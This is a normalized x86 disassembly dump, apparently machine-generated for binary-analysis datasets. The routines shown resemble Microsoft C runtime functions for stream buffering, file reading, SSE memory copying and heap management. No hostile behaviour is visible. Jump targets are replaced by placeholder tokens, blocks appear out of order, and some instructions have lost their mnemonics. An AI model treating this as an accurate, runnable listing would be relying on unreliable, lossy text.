test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebx
leave
retn
sub_4085fe
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_405ca6
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_405c3e
add esp 0x14
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_40b5ed
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
mov [ esi + 0x4 ] edi
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_40432c
pop ecx
push eax
call sub_408ceb
add esp 0xc
mov [ esi + 0x4 ] eax
cmp eax edi
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_40432c
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rw-data
push esi
call sub_40432c
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop edi
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push esi
call sub_40432c
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_40432c
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_408729
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_405cb9
and [ eax ] 0x0
call sub_405ca6
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_405cb9
mov [ eax ] ebx
call sub_405ca6
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x9
call sub_405c3e
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
mov cl [ eax + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_405cb9
mov [ eax ] ebx
call sub_405ca6
mov [ eax ] 0x9
jmp r-xdata
call sub_405cb9
mov [ eax ] ebx
call sub_405ca6
mov [ eax ] 0x16
mov [ ebp - 0x10 ] ebx
cmp edx ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_405c3e
add esp 0x14
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_40a9ea
pop ecx
mov [ ebp - 0xc ] eax
cmp eax ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_40b44f
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
mov eax [ ebp - 0xc ]
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_405ca6
mov [ eax ] 0xc
call sub_405cb9
mov [ eax ] 0x8
push ebx
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
cmp ecx ebx
jl r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_405ca6
mov [ eax ] 0x9
call sub_405cb9
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
cmp [ ebp - 0x2 ] bl
je r-xdata
push eax
call sub_405ccc
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0x10 ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_404db5
pop ecx
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp cx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0xc ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp cx 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
inc ebx
inc ebx
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
inc ebx
inc ebx
inc eax
inc eax
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0xc ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0xc ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
inc ecx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0x10 ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0xc ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_405ca6
mov [ eax ] 0x2a
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_40b44f
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_40b44f
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
inc ebx
inc ebx
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_40b44f
add esp 0x10
inc ebx
cmp eax 0x2
mov [ ecx + 0x5 ] dl
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_408ceb
push 0x10
push r--data
call sub_405254
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor esi esi
cmp eax esi
jl r-xdata
call sub_405cb9
and [ eax ] 0x0
call sub_405ca6
mov [ eax ] 0x9
call sub_405cb9
mov [ eax ] esi
call sub_405ca6
mov [ eax ] 0x9
cmp eax [ rw-data ]
jb r-xdata
call sub_405299
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov edi eax
and edi 0x1f
shl edi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + edi + 0x4 ]
and ecx 0x1
je r-xdata
mov ecx 0x7fffffff
cmp ecx [ ebp + 0x10 ]
sbb ecx ecx
inc ecx
jne r-xdata
push eax
call sub_406995
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_405cb9
mov [ eax ] esi
call sub_405ca6
mov [ eax ] 0x16
jmp r-xdata
call sub_405ca6
mov [ eax ] 0x9
call sub_405cb9
mov [ eax ] esi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_408729
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_405c3e
add esp 0x14
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_408dde
mov eax [ ebp - 0x1c ]
sub_408de8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
call sub_405ca6
push 0x16
pop esi
mov [ eax ] esi
pop edi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_4046e0
add esp 0xc
cmp [ ebp + 0x10 ] edi
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_404a50
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_405ca6
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_405c3e
add esp 0x14
mov eax esi
jmp r-xdata
sub_408e65
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
shr ecx 0x7
jmp r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_408eec
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp + 0xc ]
mov eax ebx
cdq
mov ecx eax
mov eax [ ebp + 0x8 ]
xor ecx edx
sub ecx edx
and ecx 0xf
xor ecx edx
sub ecx edx
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
mov edx ecx
or edx edi
jne r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ecx esi
and ecx 0x7f
mov [ ebp - 0x18 ] ecx
cmp esi ecx
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
neg ecx
add ecx 0x10
mov [ ebp - 0x1c ] ecx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x1c ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x1c ]
push eax
push edx
push ecx
call sub_408eec
add esp 0xc
mov eax [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
sub esi ecx
push esi
push ebx
push eax
call sub_408e65
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
add edx ebx
sub edx ecx
mov [ ebp - 0x14 ] edx
add ebx eax
sub ebx ecx
mov [ ebp - 0x10 ] ebx
mov esi [ ebp - 0x14 ]
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_408fcf
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] eax
push 0x0
sete al
push 0x1000
push eax
call [ HeapCreate@IAT ]
mov [ rw-data ] eax
test eax eax
jne r-xdata
xor eax eax
inc eax
mov [ rw-data ] eax
pop ebp
retn
pop ebp
retn
sub_408fff
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call sub_40b91a
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_40904a
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_404db5
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_4090b8
push 0xc
push r--data
call sub_405254
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_40a18c
push 0x1e
call sub_409fe1
push 0xff
call sub_409d2d
push 0x18
call sub_40a9ea
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_40917b
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_405ca6
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_405299
retn
push edi
call sub_404db5
pop ecx
push 0xfa0
push edi
call sub_40b91a
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_404db5
pop ecx
call sub_405ca6
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_409172
mov eax [ ebp - 0x1c ]
sub_40917b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_4090b8
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_409cd9
pop ecx
sub_4091ae
mov edi edi
push ebp
mov ebp esp
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
add ecx eax
jmp r-xdata
cmp eax ecx
jb r-xdata
mov edx [ ebp + 0x8 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
xor eax eax
pop ebp
retn
add eax 0x14
sub_4091de
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi esi
sub edi [ ecx + 0xc ]
add esi 0xfffffffc
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
mov [ ebp - 0x4 ] ecx
test cl 0x1
jne r-xdata
pop edi
pop esi
leave
retn
push ebx
lea ebx [ ecx + esi ]
mov edx [ ebx ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
mov [ ebp + 0xc ] ebx
test dl 0x1
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov [ ebp - 0x4 ] ecx
mov ebx 0x80000000
cmp edx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edx * 8 ]
mov ebx [ ecx + 0x4 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] ebx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
sar edx 0x4
dec edx
mov [ ebp - 0x4 ] ecx
cmp edx esi
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ edx + eax + 0x4 ] cl
cmp edx 0x20
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
pop ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] edi
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
push 0x4000
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
mov ecx [ rw-data ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ecx edx
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
mov esi 0x80000000
cmp ebx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
mov edx [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_40d2e0
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_4094f4
mov eax [ rw-data ]
push esi
mov esi [ rw-data ]
push edi
xor edi edi
cmp esi eax
jne r-xdata
imul esi esi 0x14
add esi [ rw-data ]
push 0x41c4
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ esi + 0x10 ] eax
cmp eax edi
je r-xdata
add eax 0x10
imul eax eax 0x14
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
mov [ esi + 0xc ] eax
cmp eax edi
jne r-xdata
add [ rw-data ] 0x10
mov esi [ rw-data ]
